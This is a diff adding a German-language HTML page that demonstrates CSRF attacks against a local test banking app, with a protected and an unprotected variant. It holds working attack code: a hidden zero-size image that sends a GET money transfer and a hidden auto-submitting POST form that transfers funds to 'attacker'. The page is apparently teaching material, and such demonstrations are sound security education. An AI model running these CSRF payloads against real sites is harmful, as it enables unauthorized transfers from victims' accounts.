@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="attack-style.css" />
+    <title>Attacker</title>
+  </head>
+  <body>
+    <div class="container">
+      <h1>CSRF Angriffsdemonstration</h1>
+
+      <div class="attack-section">
+        <h2>Angriffsziel: <span id="target-site"></span></h2>
+        <button class="btn" onclick="setTargetVulnerability(true)">Ungeschützt</button>
+        <button class="btn" onclick="setTargetVulnerability(false)">Geschützt</button>
+      </div>
+
+      <div class="attack-section">
+        <h2>Angriff 1: Verstecktes Image Element (GET)</h2>
+        <p>Wenn dieser Button angeklickt wird, wird das folgende Image Element der DOM hinzugefügt mit einem GET Aufruf auf das Banksystem als Bildquelle.</p>
+
+        <div class="code-block">&lt;img src="<span id="target-site"></span>/transfer.php?target=attacker&amount=50" width="0" height="0" /&gt;</div>
+
+        <button class="btn" onclick="imageAttack()"> Angriff durchführen (50€ an 'attacker')</button>
+        <div id="attack1-result" class="success"></div>
+      </div>
+
+      <div class="attack-section">
+        <h2>Angriff 2: Auto-Submit Form (POST)</h2>
+        <p>Wenn dieser Button angeklickt wird, wird die folgende versteckte Form der DOM hinzugefügt. Diese führt ohne Nutzereingabe eine POST-Anfrage auf das Banksystem aus.</p>
+
+        <div class="code-block">
+          &lt;form action="<span id="target-site"></span>/transfer.php" method="POST"&gt; &lt;input type="hidden" name="target" value="attacker"
+          /&gt; &lt;input type="hidden" name="amount" value="100" /&gt; &lt;/form&gt;
+        </div>
+
+        <button class="btn" onclick="formAttack()">Angriff durchführen (100€ an 'attacker')</button>
+        <div id="attack2-result" class="success"></div>
+      </div>
+
+      <div class="attack-section">
+        <h2>Anweisungen:</h2>
+        <ol>
+          <li>Öffne die <a href="http://localhost:8080/login.php" target="_blank">ungeschützte Bank</a> in einem anderen Tab und melde dich an.</li>
+          <li>Kehre auf diese Seite zurück und führe beliebige Angriffe durch.</li>
+          <li>Gehe zurück zur Seite der Bank, dort sind die erfolgreichen Angriffe nach Neuladen der Seite sichtbar.</li>
+          <li>Versuche dasselbe mit der <a href="http://localhost:8081/login.php" target="_blank">geschützten Bank</a>.</li>
+        </ol>
+      </div>
+    </div>
+
+    <!-- Hidden attack forms -->
+    <div id="attack-container" style="display: none"></div>
+
+    <script>
+      const vulnerableUrl = 'http://localhost:8080';
+      const protectedUrl = 'http://localhost:8081';
+
+      const attackText = 'Angriff durchgeführt';
+
+      function setTargetVulnerability(isVulnerable) {
+        if(isVulnerable) {
+          targetUrl = vulnerableUrl;
+          document.getElementById('target-site').innerText = 'Ungeschützt';
+        }
+        else {
+          targetUrl = protectedUrl;
+          document.getElementById('target-site').innerText = 'Geschützt';
+        }
+      }
+
+      setTargetVulnerability(true);
+
+      function imageAttack() {
+        const img = document.createElement('img');
+        img.src = targetUrl + '/transfer.php?target=attacker&amount=50';
+        img.width = 0;
+        img.height = 0;
+        img.onload = function () {
+          document.getElementById('attack1-result').innerHTML = attackText;
+        };
+        
+        img.onerror = function () {
+          document.getElementById('attack1-result').innerHTML = attackText;
+        };
+        document.body.appendChild(img);
+      }
+
+      function formAttack() {
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = targetUrl + '/transfer.php';
+        form.target = '_blank';
+
+        const targetInput = document.createElement('input');
+        targetInput.type = 'hidden';
+        targetInput.name = 'target';
+        targetInput.value = 'attacker';
+
+        const amountInput = document.createElement('input');
+        amountInput.type = 'hidden';
+        amountInput.name = 'amount';
+        amountInput.value = '100';
+
+        form.appendChild(targetInput);
+        form.appendChild(amountInput);
+        document.body.appendChild(form);
+        form.submit();
+
+        document.getElementById('attack2-result').innerHTML = attackText;
+      }
+
+
+      // window.onload = function() { combinedAttack(); };
+    </script>
+  </body>
+</html>
